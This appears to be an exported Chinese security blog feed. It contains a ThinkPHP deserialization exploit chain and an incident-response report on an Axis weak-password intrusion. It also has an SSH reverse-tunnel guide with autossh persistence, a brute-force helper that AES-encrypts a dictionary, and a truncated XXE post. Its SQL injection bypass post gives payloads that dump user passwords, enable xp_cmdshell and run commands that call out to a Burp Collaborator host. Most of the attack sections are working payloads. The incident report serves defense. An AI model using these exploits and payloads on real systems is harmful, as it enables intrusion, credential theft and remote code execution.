<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04-EXP"></a>0x04-EXP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"> <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="title class_">protected</span> $<span class="title class_">withEvent</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$data</span> ;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// echo urlencode(serialize($a));</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05-参考"></a>0x05-参考</h2><p><a href="https://xz.aliyun.com/t/9546#toc-18">https://xz.aliyun.com/t/9546#toc-18</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
        <tag>ThinkPHP</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/03/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>应急响应之axis弱口令入侵</title>
    <url>/2022/03/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8Baxis%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%85%A5%E4%BE%B5/</url>
    <content><![CDATA[<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>5月14日晚20点16分，收到客户通知，服务器疑似存在恶意代码。表象为：该服务器从5月12日下午18点左右开始对其他服务器发起暴力破解攻击，包括 SSH、MSSQL 暴力破解活动。</p>
<h2 id="0x02-事件处置"><a href="#0x02-事件处置" class="headerlink" title="0x02 事件处置"></a>0x02 事件处置</h2><h3 id="访谈用户"><a href="#访谈用户" class="headerlink" title="访谈用户"></a>访谈用户</h3><p><strong>访谈内容：</strong></p>
<ol>
<li>异常服务器基本信息，包括IP、用途、中间件、操作系统等？</li>
<li>几时出现异常现场？</li>
<li>异常情况是什么？</li>
<li>遭受异常服务器攻击的受害者IP信息？</li>
</ol>
<h3 id="网络连接分析"><a href="#网络连接分析" class="headerlink" title="网络连接分析"></a>网络连接分析</h3><p>根据用户描述可知，异常服务器对受害者主机发起 SSH、MSSQL 暴力破解，在异常主机输入命令：netstat -anplt | grep 1433，发现存在多条目的端口为 1433 的网络连接信息，目的IP与受害者IP信息一致，程序 PID 为 5033，对应程序为 JAVA</p>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>ps -aux | grep 5033 对应为 WEB 服务，猜测攻击者通过类似reGeorg 等工具代理流量，然后在本地发起暴力破解攻击。</p>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p><code>find  web目录路径 -ctime（-mtime） -7  -type f</code> ，查找7日内新增、改变的文件并进行分析。发现多个文件，涉及类型有 aar 包，冰蝎木马，reGeorg 流量代理工具等。</p>
<h3 id="WEB日志分析"><a href="#WEB日志分析" class="headerlink" title="WEB日志分析"></a>WEB日志分析</h3><h4 id="确认有哪些恶意文件？"><a href="#确认有哪些恶意文件？" class="headerlink" title="确认有哪些恶意文件？"></a>确认有哪些恶意文件？</h4><ol>
<li>通过find命令查找7日、30日之内变更、新增的文件。</li>
<li>通过河马、D盾对整个web目录进行扫描。</li>
<li>对筛选出来的文件再次进行人工审查，初步确认存在3个恶意文件，分别为 skin.jsp（reGeorg）、help.jsp（reGeorg）、j2ee.jsp（冰蝎）。</li>
</ol>
<h4 id="确认有多少个IP访问过恶意文件？"><a href="#确认有多少个IP访问过恶意文件？" class="headerlink" title="确认有多少个IP访问过恶意文件？"></a>确认有多少个IP访问过恶意文件？</h4><p><code>grep -ie &quot;skin.jsp\|help.jsp\|j2ee.jsp&quot; localhost_access_log* | awk &#39;&#123;print $1&#125;&#39; | sort | uniq -c</code> ，发现共15个IP访问过恶意文件。</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>112.96.67.7</td>
</tr>
<tr>
<td>2</td>
<td>13.234.116.183</td>
</tr>
<tr>
<td>3</td>
<td>58.62.206.235</td>
</tr>
<tr>
<td>4</td>
<td>58.62.206.249</td>
</tr>
<tr>
<td>5</td>
<td>112.96.195.23</td>
</tr>
<tr>
<td>6</td>
<td>120.235.159.163</td>
</tr>
<tr>
<td>7</td>
<td>120.239.76.89</td>
</tr>
<tr>
<td>8</td>
<td>223.104.66.68</td>
</tr>
<tr>
<td>9</td>
<td>112.96.193.140</td>
</tr>
<tr>
<td>10</td>
<td>120.235.159.189</td>
</tr>
<tr>
<td>11</td>
<td>120.235.159.246</td>
</tr>
<tr>
<td>12</td>
<td>223.104.63.106</td>
</tr>
<tr>
<td>13</td>
<td>45.66.134.61</td>
</tr>
<tr>
<td>14</td>
<td>112.96.173.19</td>
</tr>
<tr>
<td>15</td>
<td>117.136.41.37</td>
</tr>
</tbody></table>
<h4 id="确认这些IP中第一个访问系统的IP是什么？"><a href="#确认这些IP中第一个访问系统的IP是什么？" class="headerlink" title="确认这些IP中第一个访问系统的IP是什么？"></a>确认这些IP中第一个访问系统的IP是什么？</h4><p><code>grep -m1  &quot;112.96.67.7/|13.234.116.183.....&quot;   localhost_access_log*</code>，发现58.62.206.249为第一个访问系统的IP，访问时间为：11&#x2F;May&#x2F;2021:12:15:23</p>
<h4 id="确认这些IP访问过什么文件，发送过什么请求包？"><a href="#确认这些IP访问过什么文件，发送过什么请求包？" class="headerlink" title="确认这些IP访问过什么文件，发送过什么请求包？"></a>确认这些IP访问过什么文件，发送过什么请求包？</h4><ol>
<li><code>grep -ie &quot;IP地址.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; |awk -F &#39;?&#39; &#39;&#123;print $1&#125;&#39; | sort | uniq -c | sort -rnk 1</code> ，查询成功访问的uri资源，发现对含有AxisInvoker的路径访问频繁; </li>
<li><code>grep -ie &quot;IP地址.*AxisInvoker.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; | sort | uniq -c | sort -rnk 1</code> ，排查 AxisInvoker，检查方法参数，分析攻击者操作，发现该文件对应7天内新增的 AxisInvoker.aar 包，是后门程序，攻击者通过该后门程序写入skin.jsp（reGeorg）、help.jsp（reGeorg）、j2ee.jsp（冰蝎），反弹shell等。</li>
</ol>
<h4 id="确认什么时候第一次获取控制权？"><a href="#确认什么时候第一次获取控制权？" class="headerlink" title="确认什么时候第一次获取控制权？"></a>确认什么时候第一次获取控制权？</h4><ol>
<li><code>grep -m1 -c10 -ie &quot;AxisInvoker&quot;  localhost_access_log*</code>，发现第一次出现 AxisInvoker 记录的 IP：<code>58.62.206.249</code>，出现时间：<code>11/May/2021:13:39:08</code>，对上一条日志记录为 <code>/r1/axis2-admin/upload</code></li>
<li>检查第一次访问系统时间：<code>11/May/2021:12:15:23</code> 与第一次出现 AxisInvoker 记录：<code>11/May/2021:13:39:08</code> 之间的日志，未发现其他异常的情况。</li>
<li>综上，判断攻击者登陆了 axis2 后台，并通过后台部署AxisInvoker.aar 包，获取控制权限，初次获取控制权限的时间为：<code>11/May/2021:13:39:08</code>。</li>
</ol>
<h2 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h2><p>经分析整理，本次信息安全事件是由 axis 管理后台存在弱口令漏洞导致。攻击者通过 axis 弱口令登录管理后台，在管理后台部署恶意aar包获取控制权限。后续则通过上传冰蝎木马，reGeorg 流量代理工具等进一步控制服务器并开展横向渗透攻击。
 </p>
]]></content>
  </entry>
  <entry>
    <title>内网穿透之ssh反向隧道</title>
    <url>/2022/03/19/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8Bssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93/</url>
    <content><![CDATA[<h1 id="ssh反向隧道"><a href="#ssh反向隧道" class="headerlink" title="ssh反向隧道"></a>ssh反向隧道</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>一种简单的内网穿透方式</p>
<h2 id="场景示例"><a href="#场景示例" class="headerlink" title="场景示例"></a>场景示例</h2><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage473fb8ec7ad265461809000af8c0d6b3402d6d2d6db7573a4694e7980c08b640.png"></p>
<h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><h3 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h3><ol>
<li>&#x2F;etc&#x2F;ssh&#x2F;sshd_config，GatewayPorts参数值为yes</li>
<li>systemctl restart sshd.service，重启ssh服务</li>
</ol>
<h3 id="内网电脑"><a href="#内网电脑" class="headerlink" title="内网电脑"></a>内网电脑</h3><p><strong>简单建立ssh反向隧道</strong> <br>执行命令：<code>ssh -ngfNTR &lt;VPS监听端口&gt;:&lt;内网主机IP&gt;:&lt;内网主机需要转发到VPS的端口&gt; root@&lt;VPS地址&gt; -o ServerAliveInterval=300</code>。例如：<code>ssh -ngfNTR 80:127.0..0.1:22 root@150.158.xx.xx -o ServerAliveInterval=300</code></p>
<ul>
<li>-f 表示后台执行</li>
<li>-N 表示不执行任何命令</li>
<li>-R 建立反向隧道</li>
<li>1222 A机用来外面ssh的监听端口</li>
<li>-o ServerAliveInterval&#x3D;300 的意思是让ssh client每300秒就给server发个心跳,以免链路被RST. </li>
<li>-f Requests ssh to go to background just before command execution. 让该命令后台运行 . </li>
<li>-n Redirects stdin from &#x2F;dev&#x2F;null (actually, prevents reading from stdin). </li>
<li>-N Do not execute a remote command. 不执行远程命令 . </li>
<li>-T Disable pseudo-tty allocation. 不占用 shell . </li>
<li>-g Allows remote hosts to connect to local forwarded ports.</li>
</ul>
<p><strong>持久建立ssh反向隧道-1</strong> </p>
<ol>
<li>安装autossh；</li>
<li>新建<code>/opt/sshPortMapping.sh</code>，赋予644权限，内容为:<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">autossh -M 7890 -NR 80:127.0.0.1:22 root@150.158.xx.xx -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></li>
<li>新建开机自启动服务文件 <code>/usr/lib/systemd/system/autosshd.service</code>：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Auto SSH Tunnel</span><br><span class="line">After=network-online.target</span><br><span class="line">StartLimitInterval=10</span><br><span class="line">[Service]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">User=root</span></span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/bin/bash /opt/sshPortMapping.sh</span><br><span class="line">ExecReload=/bin/kill -HUP $MAINPID</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=5</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">WantedBy=graphical.target</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">WantedBy=default.target</span></span><br></pre></td></tr></table></figure></li>
<li>设置为开机自启动服务：<code>systemctl enable autosshd.service</code></li>
<li>启动服务：<code>systemctl start autosshd </code></li>
</ol>
<blockquote>
<p><strong>PS：</strong> 因为autossh需要交互输入vps的密码，存在不便。所以使用证书登陆，autossh通过-i指定证书文件进行免密登陆，所以“持久建立ssh反向隧道”还需要在内网主机生成证书，并将公钥上传vps。<br>   6. 至此，其他机器就可以<code>ssh root@150.158.84.84 -p 80</code>访问内网主机。 </p>
</blockquote>
<p><strong>持久建立ssh反向隧道-2</strong></p>
<p>将<code>/opt/sshPortMapping.sh</code>代码替换为以下，其余同“持久建立ssh反向隧道-1”操作一样：<br><code>autossh -M 7890 -fN -o &quot;PubkeyAuthentication=yes&quot; -o &quot;StrictHostKeyChecking=false&quot; -o &quot;PasswordAuthentication=no&quot; -o &quot;ServerAliveInterval 60&quot; -o &quot;ServerAliveCountMax 3&quot; -R 80:127.0.0.1:22 root@150.158.84.84 -i ~/.ssh/id_rsa</code></p>
<h2 id="基于ssh反向隧道建立socket代理"><a href="#基于ssh反向隧道建立socket代理" class="headerlink" title="基于ssh反向隧道建立socket代理"></a>基于ssh反向隧道建立socket代理</h2><p>通过上面的设置已经可以访问内网主机的ssh端口，基于以上，在其他client主机上执行以下命令：<code>ssh -N -D 127.0.0.1:9999 root@150.158.xx.xx -p 80</code>。接下来就可以将浏览器浏代理设置为<code>socket//127.0.0.1:9999</code>，将内网主机将作为代理服务器。</p>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><ol>
<li>测试中，非root用户无法无法建立转发，原因未明。</li>
</ol>
]]></content>
      <categories>
        <category>内网穿透</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
        <tag>ssh</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>暴力破解之前端AES加密</title>
    <url>/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试中遇到一个信息泄露漏洞。页面提供一个查询功能，用户需要填写两个或三个参数值，且参数值正确才能返回相关信息。在测试中，发现仅需提供一个参数值即可以返回相关信息。如在提供<em><strong>姓名输入框</strong></em>中填入：“吴翠”，即可返回“吴翠”的相关信息。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318120459.png"></p>
<h2 id="0x02-AES加密的参数"><a href="#0x02-AES加密的参数" class="headerlink" title="0x02-AES加密的参数"></a>0x02-AES加密的参数</h2><p>测试过程中，发现参数值经过加密，翻查JS文件，确认是AES加密。<br>一开始的想法是使用 Burpsuite 的 <code>JS Rainbow</code> 插件加载JS文件，自动执行加密函数加密参数值进行爆破，后发现导入字典测试的时候，由于字典内容为中文，会导致加密结果与预期不一致，后端无法解析加密后的数据，导致查询失败。<br>后续尝试使用 <code>BurpCrypto</code>、<code>AES KILLER</code>等 Burpsuite 插件时均与上面情况一样，中文内容加密与预期不一致。估计是由于 Burpsuite 软件自身问题。<br>再后使用 python 写个小程序，将字典加密，将加密结果作为字典导入 Burpsuite 爆破才成功。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318122718.png"></p>
<p><strong>加密小程序源代码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">b&#x27;FC5E8DF8BB4A2F78&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27;!1@2#3$4%5^6&amp;7*8&#x27;</span></span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    padtext=pad(text,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipherText=cryptos.encrypt(padtext)</span><br><span class="line">    <span class="keyword">return</span> base64.encodebytes(cipherText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;500.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fs.readlines():</span><br><span class="line">            name = <span class="built_in">bytes</span>(line.strip(),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            e = encrypt(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(e.strip(), encoding = <span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>暴力破解</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>某CDN SQLi注入Bypass</title>
    <url>/2022/03/19/%E6%9F%90CDN-SQLi%E6%B3%A8%E5%85%A5Bypass/</url>
    <content><![CDATA[<h2 id="0x01-前言："><a href="#0x01-前言：" class="headerlink" title="0x01 前言："></a>0x01 前言：</h2><p>某次测试，发现目标存在 SQLi 注入漏洞，站点采用某信服CDN，且提供防护功能。由于无法找到真实IP地址，遂有本次测试。</p>
<h2 id="0x02-Payload"><a href="#0x02-Payload" class="headerlink" title="0x02 Payload"></a>0x02 Payload</h2><p>目标站点信息一览表</p>
<ul>
<li>中间件：IIS</li>
<li>数据库：MSSQL</li>
<li>脚本语言：aspx</li>
</ul>
<h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><h4 id="绕过-union-selec-常规函数-："><a href="#绕过-union-selec-常规函数-：" class="headerlink" title="绕过 union selec+常规函数 ："></a>绕过 <code>union selec+常规函数</code> ：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall select--^!~%*/%0b%0anull,null,null,null,db_name--%0a(),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过-union-select-x-from-x-："><a href="#绕过-union-select-x-from-x-：" class="headerlink" title="绕过 union select x from x ："></a>绕过 <code>union select x from x </code>：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall(select--^!~%*/%0b/*%0anull,null,null,null,1,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b/*%0afrom--^!~%*/%0b/*%0ax)--</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过-union-all-select-x-from-x-："><a href="#绕过-union-all-select-x-from-x-：" class="headerlink" title="绕过 union all select x from x ："></a>绕过 <code>union all select x from x</code> ：</h4><p><strong>查表名：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,name,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asysobjects)--</span></span><br></pre></td></tr></table></figure>

<p><strong>查字段名：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,COLUMN_NAME,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0ainformation_schema.COLUMNS where TABLE_NAME=&#x27;</span>sys_User<span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure>

<p><strong>查数据：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,U_LoginName,U_Password ,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asys_User)--</span></span><br></pre></td></tr></table></figure>

<p><strong>开启xp_cmdshell：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;EXEC--^!~%*/%0b%0asp_configure &#x27;</span><span class="keyword">show</span> advanced options<span class="string">&#x27;, 1;RECONFIGURE;EXEC--^!~%*/%0b%0asp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;, 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure>

<p><strong>执行ping命令测试：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;exec--^!~%*/%0b%0amaster..xp_cmdshell%20%27ping%20hn81hzwt1rqcgj20qnh50is0drjh76.burpcollaborator.net%27--</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
        <tag>注入</tag>
        <tag>bypass</tag>
        <tag>CDN</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>通过 Office Open XML 解析器进行XXE攻击</title>
    <url>/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
